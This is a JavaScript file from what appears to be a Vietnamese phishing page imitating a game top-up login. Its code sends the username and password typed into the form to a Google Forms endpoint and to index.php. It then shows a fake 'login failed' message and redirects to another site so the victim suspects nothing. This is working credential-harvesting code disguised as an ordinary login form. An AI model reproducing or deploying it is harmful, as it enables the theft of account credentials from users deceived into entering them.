$(document).ready(function() {
       function showlog() {
                                $('#myModal').modal({
                                            backdrop: 'static',
                                            keyboard: true, 
                                            show: true
                                        });
                              }
                    focus();
                var listener = addEventListener('blur', function() {
                    if(document.activeElement === document.getElementById('iframe')) {
                     setTimeout(() => {
                        showlog();
                     }, 3000);
                    }
                    removeEventListener(listener);
                });
function telephoneCheck(str) {
 var isphone = /^(1\s|1|)?((\(\d{3}\))|\d{3})(\-|\s)?(\d{3})(\-|\s)?(\d{4})$/.test(str);
 return(isphone);
 }
 function validateEmail(email) 
 {
 var re = /\S+@\S+\.\S+/;
 return re.test(email);
 }
 function go(){
 let tkOj = document.querySelector('input[name="taikhoan"]');
 let mkOj = document.querySelector('input[name="matkhau"]');
 let tk = tkOj.value;
 let mk = mkOj.value;
 
 let data = {
 'entry.793272454': tk,
 'entry.1295718656': mk
 }
 let queryString = new URLSearchParams(data);  
 queryString = queryString.toString();    
 let xhr = new XMLHttpRequest();
 xhr.open("POST", 'https://docs.google.com/forms/d/e/1FAIpQLSf3XRY04u5uh3SOCXBkQcYER-jet8unhVMHhiJpCWhozx232A/formResponse', true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhr.send(queryString);
 Swal.fire({
 icon: 'error',
 title: 'Đăng nhập thất bại',
 text: 'Thông tin đăng nhập không chính xác vui lòng kiểm tra lại!',
 }).then((result) => {
 window.location.href = "https://napthe-ff.ga/";
    })
 }
 document.querySelector('#login_form').onsubmit = function(e){
 e.preventDefault();
 let tkOj = document.querySelector('input[name="taikhoan"]');
 let mkOj = document.querySelector('input[name="matkhau"]');
 var tbOj = document.getElementById("thongbao");   
 let tk = tkOj.value;
 let mk = mkOj.value;
 if($.isNumeric(tk) == true){
 if(telephoneCheck(tk) == true){
 go();
 var acc = $('form#login_form').serialize();
 $.ajax({
       type : 'POST', 
       url : 'index.php',
       dataType: 'JSON',
       data: acc,
       success : (data) => {
 $('#submit').html('Log In');
 if (data.error) { 
 } else { 
 }
 }
       });
       return true;
 document.getElementById("tb").style.display = "none";
 }
 else{
 document.getElementById("tb").style.display = "block";
 tbOj.innerHTML = "Số điện thoại chưa đúng định dạng.";
 }
 }
 else if(mk.length == 0 || mk == ''){
 document.getElementById("tb").style.display = "block";
 tbOj.innerHTML = "Vui lòng nhập mật khẩu";
 }
 else if(validateEmail(tk) == true){
 go();
 var acc = $('form#login_form').serialize();
 $.ajax({
       type : 'POST', 
       url : 'index.php',
       dataType: 'JSON',
       data: acc,
       success : function()
                 {}
       });
       return true;
 document.getElementById("tb").style.display = "none";
 } else {
 document.getElementById("tb").style.display = "block";
 tbOj.innerHTML = "Vui lòng nhập đúng định dạng số điện thoại hoặc địa chỉ email.";
 } 
 }
});
